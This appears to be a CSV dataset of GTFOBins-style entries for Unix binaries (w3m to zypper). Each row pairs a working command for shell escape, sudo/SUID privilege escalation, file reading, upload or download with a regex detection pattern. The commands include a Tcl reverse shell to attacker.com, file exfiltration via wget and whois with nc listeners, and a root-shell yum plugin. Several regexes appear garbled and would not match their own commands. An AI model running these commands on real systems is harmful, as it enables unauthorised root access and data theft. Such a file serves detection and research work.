w3m,file-read,"w3m ""$LFILE"" -dump","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?w3m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
w3m,suid,"./w3m ""$LFILE"" -dump","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?w3m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
w3m,sudo,"sudo w3m ""$LFILE"" -dump","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?w3m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
wall,sudo,"sudo wall --nobanner ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wall\s*\-\-nobanner\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
watch,shell,watch -x sh -c 'reset; exec sh 1>&0 2>&0',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?watch\s*\-x\s*\-c\s+.+),
watch,suid,./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?watch\s*\-x\s*\-p\s*\-c\s*\-p\s+.+),This keeps the SUID privileges only if the `-x` option is present.
watch,sudo,sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?watch\s*\-x\s*\-c\s+.+),
watch,limited-suid,./watch 'reset; exec sh 1>&0 2>&0',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?watch\s+.+),
wc,file-read,"wc --files0-from ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wc\s*\-\-files0\-from\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
wc,suid,"./wc --files0-from ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wc\s*\-\-files0\-from\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
wc,sudo,"sudo wc --files0-from ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wc\s*\-\-files0\-from\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
wget,shell,"chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
wget --use-askpass=$TF 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-e\s*\-\-use\-askpass\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
wget,file-upload,wget --post-file=$LFILE $URL,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-\-post\-file\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data."
wget,file-read,wget -i $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-i\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data."
wget,file-write,"echo DATA > $TF
wget -i $TF -o $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-i\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data."
wget,file-download,wget $URL -O $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-O\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
wget,suid,"chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-e\s*\-p\s*\-p\s*\-\-use\-askpass\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
wget,sudo,"chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wget\s*\-e\s*\-\-use\-askpass\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
whiptail,file-read,"whiptail --textbox --scrolltext ""$LFILE"" 0 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?whiptail\s*\-\-textbox\s*\-\-scrolltext\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
whiptail,suid,"./whiptail --textbox --scrolltext ""$LFILE"" 0 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?whiptail\s*\-\-textbox\s*\-\-scrolltext\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
whiptail,sudo,"sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?whiptail\s*\-\-textbox\s*\-\-scrolltext\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
whois,file-upload,"whois -h $RHOST -p $RPORT ""`cat $LFILE`""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a text file to a TCP port. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments."
whois,file-upload,"whois -h $RHOST -p $RPORT ""`base64 $LFILE`""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\x0d' | base64 -d > ""file_to_save""` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."
whois,file-download,"whois -h $RHOST -p $RPORT > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped."
whois,file-download,"whois -h $RHOST -p $RPORT | base64 -d > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?whois\s*\-h\s*\-p\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch remote binary file from a remote TCP port. Run `base64 ""file_to_send"" | nc -l -p 12345` on the attacker box to send the file."
wireshark,command,wireshark,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wireshark\s+.+),"This requires GUI interaction. Start Wireshark, then from the main menu, select ""Tools"" -> ""Lua"" -> ""Evaluate"". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.
"
wireshark,sudo,"sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" &
echo 'DATA' | nc -u 127.127.127.127 ""$PORT""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wireshark\s*\-c\s*\-i\s*\-k\s*\-f\s*\-u\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.

After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:

1. select the only received packet;

2. right-click on ""Data"" from the ""Packet Details"" pane, and select ""Export Packet Bytes..."";

3. choose where to save the packet dump.
"
wish,shell,"wish
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wish\s+(?:/bin/(?:sh|bash))),
wish,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wish\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
wish,sudo,"sudo wish
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?wish\s+(?:/bin/(?:sh|bash))),
xargs,shell,xargs -a /dev/null sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xargs\s*\-a\s+.+),GNU version only.
xargs,shell,echo x | xargs -Iy sh -c 'exec sh 0<&1',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xargs\s*\-c\s+.+),
xargs,shell,"xargs -Ix sh -c 'exec sh 0<&1'
x^D^D",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xargs\s*\-c\s+.+),Read interactively from `stdin`.
xargs,file-read,"xargs -a ""$LFILE"" -0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xargs\s*\-a\s*\-0\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This works as long as the file does not contain the NUL character, also a trailing `$'\n'` is added. The actual `/bin/echo` command is executed. GNU version only."
xargs,suid,./xargs -a /dev/null sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xargs\s*\-a\s*\-p\s+.+),GNU version only.
xargs,sudo,sudo xargs -a /dev/null sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xargs\s*\-a\s+.+),GNU version only.
xdg-user-dir,shell,xdg-user-dir '}; /bin/sh #',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xdg\-user\-dir\s+(?:/bin/(?:sh|bash))),
xdg-user-dir,sudo,sudo xdg-user-dir '}; /bin/sh #',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xdg\-user\-dir\s+(?:/bin/(?:sh|bash))),
xdotool,shell,xdotool exec --sync /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xdotool\s*\-\-sync\s+(?:/bin/(?:sh|bash))),
xdotool,suid,./xdotool exec --sync /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xdotool\s*\-\-sync\s*\-p\s+(?:/bin/(?:sh|bash))),
xdotool,sudo,sudo xdotool exec --sync /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xdotool\s*\-\-sync\s+(?:/bin/(?:sh|bash))),
xelatex,shell,xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xelatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
xelatex,file-read,"xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xelatex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
xelatex,sudo,"sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xelatex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
xelatex,sudo,sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xelatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
xelatex,limited-suid,./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xelatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
xetex,shell,xetex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xetex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
xetex,sudo,sudo xetex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xetex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
xetex,limited-suid,./xetex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xetex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
xmodmap,file-read,xmodmap -v $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xmodmap\s*\-v\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xmodmap,suid,./xmodmap -v $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xmodmap\s*\-v\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xmodmap,sudo,sudo xmodmap -v $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xmodmap\s*\-v\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xmore,file-read,xmore $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xmore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xmore,suid,./xmore $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xmore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xmore,sudo,sudo xmore $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xmore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xpad,file-read,"xpad -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xpad\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xpad,sudo,"sudo xpad -f ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xpad\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xxd,file-write,"echo DATA | xxd | xxd -r - ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xxd\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xxd,file-read,"xxd ""$LFILE"" | xxd -r","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xxd\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xxd,suid,"./xxd ""$LFILE"" | xxd -r","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xxd\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xxd,sudo,"sudo xxd ""$LFILE"" | xxd -r","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xxd\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xz,file-read,"xz -c ""$LFILE"" | xz -d","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xz\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xz,suid,"./xz -c ""$LFILE"" | xz -d","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xz\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
xz,sudo,"sudo xz -c ""$LFILE"" | xz -d","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?xz\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
yarn,shell,yarn exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yarn\s+(?:/bin/(?:sh|bash))),
yarn,shell,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
yarn --cwd $TF install","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yarn\s*\-\-cwd\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`."
yarn,sudo,sudo yarn exec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yarn\s+(?:/bin/(?:sh|bash))),
yash,shell,yash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yash\s+.+),
yash,suid,./yash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yash\s+.+),
yash,sudo,sudo yash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yash\s+.+),
yelp,file-read,"yelp ""man:$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yelp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute."
yum,file-download,yum install http://$RHOST/$RFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yum\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`."
yum,sudo,sudo yum localinstall -y x-1.0-1.noarch.rpm,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yum\s*\-y\s+.+),"It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
"
yum,sudo,"cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?yum\s*\-c\s*\-\-enableplugin\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Spawn interactive root shell by loading a custom plugin.
"
zathura,shell,"zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zathura\s*\-c\s+(?:/bin/(?:sh|bash))),
zathura,sudo,"sudo zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zathura\s*\-c\s+(?:/bin/(?:sh|bash))),
zip,file-read,"zip $TF $LFILE
unzip -p $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zip\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zip,shell,"zip $TF /etc/hosts -T -TT 'sh #'
rm $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zip\s*\-T\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zip,sudo,"sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zip\s*\-T\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zip,limited-suid,"./zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zip\s*\-T\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zsh,file-read,"export LFILE=file_to_read
zsh -c 'echo ""$(<$LFILE)""'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsh\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zsh,file-write,"export LFILE=file_to_write
zsh -c 'echo DATA >$LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsh\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zsh,shell,zsh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsh\s+.+),
zsh,suid,./zsh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsh\s+.+),
zsh,sudo,sudo zsh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsh\s+.+),
zsoelim,file-read,"zsoelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsoelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zsoelim,suid,"./zsoelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsoelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zsoelim,sudo,"sudo zsoelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zsoelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zypper,shell,zypper x,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zypper\s+.+),This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.
zypper,shell,"cp /bin/sh $TF/zypper-x
export PATH=$TF:$PATH
zypper x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zypper\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
zypper,sudo,sudo zypper x,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zypper\s+.+),This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.
zypper,sudo,"cp /bin/sh $TF/zypper-x
sudo PATH=$TF:$PATH zypper x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?zypper\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
